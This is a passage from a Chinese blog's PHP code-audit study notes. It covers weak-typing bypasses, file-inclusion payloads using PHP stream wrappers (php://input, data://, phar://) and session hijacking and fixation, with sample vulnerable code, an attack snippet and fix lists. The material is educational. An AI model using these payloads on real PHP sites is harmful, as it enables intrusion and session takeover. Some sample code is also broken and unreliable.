</li>
<li><p>==弱类型，===强类型</p>
</li>
</ol>
<p>empty()：变量为0，”0“，null，‘’，false，array()，返回ture</p>
<p>isset：变量未定义或者为null时，返回false</p>
<p>md5</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> md5(<span class="built_in">string</span> $str[,boo $raw_output = <span class="literal">false</span>])</span><br></pre></td></tr></table></figure>

<p>绕过：传入数组（非字符串），返回为NULL</p>
<p>函数strcmp</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="keyword">strcmp</span>(<span class="keyword">string</span> $str1, <span class="keyword">string</span> $str2)</span><br></pre></td></tr></table></figure>

<p>绕过，传入数组（非字符串），返回为0    （字符相同返回为0）</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563416371109.png" alt="1563416371109"></p>
<p>switch    会将参数转化为整型，（ ‘67sfajf ’  -&gt;  67 ）</p>
<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><p>file:// 协议</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<p>执行文件内容</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">file</span>://E:Local <span class="keyword">Test</span>\WWW\<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure>

<p>php://filter</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<p>读取文件内容，base64编码</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=conver.base64-encode/resource=./<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>

<p>php://input 可以访问请求的原始数据的只读流</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  on</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url:<span class="built_in">file</span>.php?<span class="built_in">file</span>=php://input</span><br><span class="line"><span class="built_in">post</span>:<span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>写入文件:</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url:<span class="built_in">file</span>.php?<span class="built_in">file</span>=php://input</span><br><span class="line"><span class="built_in">post</span>:<span class="meta">&lt;?</span>php fputs(fopen(<span class="string">"1.txt"</span>,<span class="string">"w"</span>),<span class="string">"1234"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>(觉着就是，执行你post的代码，还认为你post的代码是从文件中提取出来的)</p>
<p>data://协议</p>
<p>allow_url_fopen   :  on</p>
<p>allow_url_include   :  on</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://localhost/test.php?<span class="built_in">file</span>=data://<span class="keyword">text</span>/plain,<span class="meta">&lt;?</span>php phpinfo()<span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">http</span>://localhost/test.php?<span class="built_in">file</span>=data://<span class="keyword">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line"><span class="keyword">http</span>://localhost/test.php?<span class="built_in">file</span>=data:<span class="keyword">text</span>/plain,<span class="meta">&lt;?</span>php phpinfo()<span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">http</span>://localhost/test.php?<span class="built_in">file</span>=data:<span class="keyword">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>

<p>zip://协议</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/test.php?file=zip:/</span><span class="regexp">/D:/</span>phpStudy<span class="regexp">/WWW/</span>txf.zip%<span class="number">23</span>txf.txt</span><br></pre></td></tr></table></figure>

<p>bzip2://协议</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/test.php?file=compress.zlib:/</span><span class="regexp">/./</span>txf.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563417336599.png" alt="1563417336599"></p>
<p>phar://伪协议</p>
<p>首先我们要用phar类打包一个phar标准包</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">new</span> PharData(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/phartest2.zip'</span>, <span class="number">0</span>,<span class="string">'phartest2'</span>,Phar::ZIP) ; </span><br><span class="line">$x=file_get_contents(<span class="string">'./php.php'</span>);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'a.jpg'</span>, </span><br><span class="line">$x); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>会生成一个zip的压缩文件。然后我们构造</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/file.php?file=phar:/</span><span class="regexp">/php.zip/</span>php.jpg</span><br></pre></td></tr></table></figure>

<p>也可以直接shell</p>
<p>其中phar适用范围为php&gt;5.3.0</p>
<p>以下的这种包含方式在这样的情况下是无效的。</p>
<p>include(一个规定的路径+可控点)            (?没太理解，待解决)</p>
<h3 id="会话认证漏洞"><a href="#会话认证漏洞" class="headerlink" title="会话认证漏洞"></a>会话认证漏洞</h3><p>Session 固定动机</p>
<p>Session 劫持攻击</p>
<p>挖掘经验</p>
<p>遇到的比较多的就是出现在cookie验证上，通常是没有使用session来认证，直接将用户信息保存在cookie中</p>
<p>劫持攻击</p>
<p>劫持目标用户的session id来获取网站服务器上未经许可的存取信息，窃取目标用户等cookie数据，来取得网站的认可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_POST[&apos;login&apos;]))&#123;</span><br><span class="line">	$username = $_POST[&apos;username&apos;];</span><br><span class="line">    $password = $_POST[&apos;password</span><br><span class="line">    $con = 	mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">	mysql_select_db(&apos;admin&apos;,$conn);</span><br><span class="line">	$sql = &quot;SELECT* FROM admin WHERE username =&apos; &quot;.$_username.&quot;&apos;&quot;;</span><br><span class="line">	$request = mysql_query($sql) or die(&quot;fail&quot;).mysql_error();</span><br><span class="line">	if($row = mysql_num_rows($result))&#123;</span><br><span class="line">    $_SESSION[&apos;username&apos;]=$username;</span><br><span class="line">    $_SESSION[&apos;password&apos;]=$password;</span><br><span class="line">    $_SESSIon[&apos;book&apos;] = 1;</span><br><span class="line">    header(&quot;localhost:http//127.0.0.1/member.php?user=&quot;.$username);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form method = &apos;post&apos; name=&apos;form&apos;&gt;</span><br><span class="line">            账号：&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;</span><br><span class="line">            密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;</span><br><span class="line">            &lt;input type = &quot;submit&quot; name=&apos;login&apos;/&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'session_id '</span>. session_id().<span class="string">"&lt;br/ &gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'name: '</span>. $_GET[<span class="string">'user'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"book_num"</span>. $_SESSION[<span class="string">'book'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于回显了session_id，</p>
<p>攻击脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'session_id '</span>. session_id().<span class="string">"&lt;br/ &gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'name: '</span>. $_SESSION[<span class="string">'username'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"book_num"</span>. $_SESSION[<span class="string">'book'</span>]=<span class="number">2000.</span><span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url:/attak.php?<span class="attribute">PHPSESSIONID</span>=jdisoay8hdsiaf8yqr89fu39</span><br></pre></td></tr></table></figure>

<p>由于id的泄露，导致攻击者更改了该事件中的book数量。</p>
<p>修复方案：</p>
<ol>
<li>使用随机而且长度够大的数字或字符串来充当session_id</li>
<li>将网页之间传递的数据使用某种形式进行封装，特别是session_id</li>
<li>更改session名称</li>
<li>注销后即销毁session的所数据</li>
</ol>
<p>Session固定攻击</p>
<p>黑客固定住目标用户的session_id，因此目标用户所使用的session可有攻击者指定</p>
<p>（即目标用户用了黑客的session存取数据，黑客再用该session，读取目标的数据）</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">有这么一个场景，当管理员登陆之后，程序生成一个认证session，而此时的session是没有指定session_id的。如果存在一个接口能够让我们指定session_id，那么我们就可以在设置一个session_id连接到这个已经认证的session上去。</span><br><span class="line"></span><br><span class="line">构造一个请求设置session_id的链接让管理员点击，那么我们就拥有了管理员的权限。（CSRF）</span><br><span class="line"></span><br><span class="line">在攻击成功之后，怎么设置我们的session_id呢？</span><br><span class="line"></span><br><span class="line">其实就是我们前端经常看到的这个东西。</span><br><span class="line"></span><br><span class="line"><span class="attribute">PHPSESSID</span>=fdpmos0quo6o7rq69h6v1u6i50;</span><br><span class="line">攻击成功之后，设置<span class="attribute">PHPSESSID</span>=你自己设置的session_id，然后带着这个cookie请求即可访问后台。</span><br></pre></td></tr></table></figure>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">请求后台任意需要认证的页面都是会调用session()方法，而且sessionid的接收是REQUEST方式，那么我们只要让登陆后台的管理员点击类似这样的链接，就可以拿到后台的权限了。</span><br><span class="line"></span><br><span class="line">http://demo.yxcms.<span class="keyword">com</span>/<span class="built_in">index</span>.php?r=admin/<span class="built_in">index</span>/<span class="built_in">index</span>&amp;sessionid=<span class="number">123</span>test</span><br><span class="line"></span><br><span class="line">要让管理员登陆状态下点你的链接，最好的方法是找到个后台的xss啦。</span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://xz.aliyun.com/t/2025" target="_blank" rel="noopener">https://xz.aliyun.com/t/2025</a></p>
<p>修复方案</p>
<ol>
<li><p>不要从GET/POST变量中接受session_id</p>
</li>
<li><p>调用session_start函数后，立即生成新的session_id，并删除就得session</p>
</li>
<li><p>将session_id存放在cookie内</p>
</li>
<li><p>注销后即销毁session的所有数据</p>
</li>
<li><p>使用时间戳来记录session的使用时间，如果两次session的相差时间太长，就销毁session的所有数据</p>
</li>
<li><p>检查用户的ip地址，如果ip地址改变就产生新的session_id</p>
<p>且删除旧的session</p>
</li>
</ol>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/note/" rel="tag"># note</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/07/14/赛博杯2019_Write_Up/" rel="next" title="赛博杯2019_Write_Up">
                <i class="fa fa-chevron-left"></i> 赛博杯2019_Write_Up
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/07/21/python 正则/" rel="prev" title="python 正则">
                python 正则 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="V">
            
              <p class="site-author-name" itemprop="name">V</p>
              <p class="site-description motion-element" itemprop="description">It is not ignorance and weakness but arrogance that destroys mankind</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                blogroll
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://fzwjscj.top/" title="fzwjscj" target="_blank">fzwjscj</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://dldxz.cn/" title="DLDXZ" target="_blank">DLDXZ</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://fanda.cloud/" title="fanda" target="_blank">fanda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://passingfoam.com/" title="PassingFoam's blog" target="_blank">PassingFoam's blog</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#代码审计基础入门笔记"><span class="nav-number">1.</span> <span class="nav-text">代码审计基础入门笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#审计大致方向、思路"><span class="nav-number">1.0.1.</span> <span class="nav-text">审计大致方向、思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-ini"><span class="nav-number">1.0.2.</span> <span class="nav-text">php.ini</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码调试小技巧"><span class="nav-number">1.0.3.</span> <span class="nav-text">代码调试小技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#全局变量和超全局变量"><span class="nav-number">1.0.4.</span> <span class="nav-text">全局变量和超全局变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-number">1.0.5.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#宽字节注入、二次注入（扫描不出来）"><span class="nav-number">1.0.6.</span> <span class="nav-text">宽字节注入、二次注入（扫描不出来）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码执行漏洞"><span class="nav-number">1.0.7.</span> <span class="nav-text">代码执行漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行漏洞"><span class="nav-number">1.0.8.</span> <span class="nav-text">命令执行漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS漏洞"><span class="nav-number">1.0.9.</span> <span class="nav-text">XSS漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF漏洞（最容易被忽略）"><span class="nav-number">1.0.10.</span> <span class="nav-text">CSRF漏洞（最容易被忽略）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传"><span class="nav-number">1.0.11.</span> <span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目录穿越以及文件包含"><span class="nav-number">1.0.12.</span> <span class="nav-text">目录穿越以及文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含"><span class="nav-number">1.0.13.</span> <span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意文件读取以及删除（修改）"><span class="nav-number">1.0.14.</span> <span class="nav-text">任意文件读取以及删除（修改）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量覆盖漏洞"><span class="nav-number">1.0.15.</span> <span class="nav-text">变量覆盖漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反序列化漏洞"><span class="nav-number">1.0.16.</span> <span class="nav-text">反序列化漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP弱类型"><span class="nav-number">1.0.17.</span> <span class="nav-text">PHP弱类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP伪协议"><span class="nav-number">1.0.18.</span> <span class="nav-text">PHP伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#会话认证漏洞"><span class="nav-number">1.0.19.</span> <span class="nav-text">会话认证漏洞</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">V</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
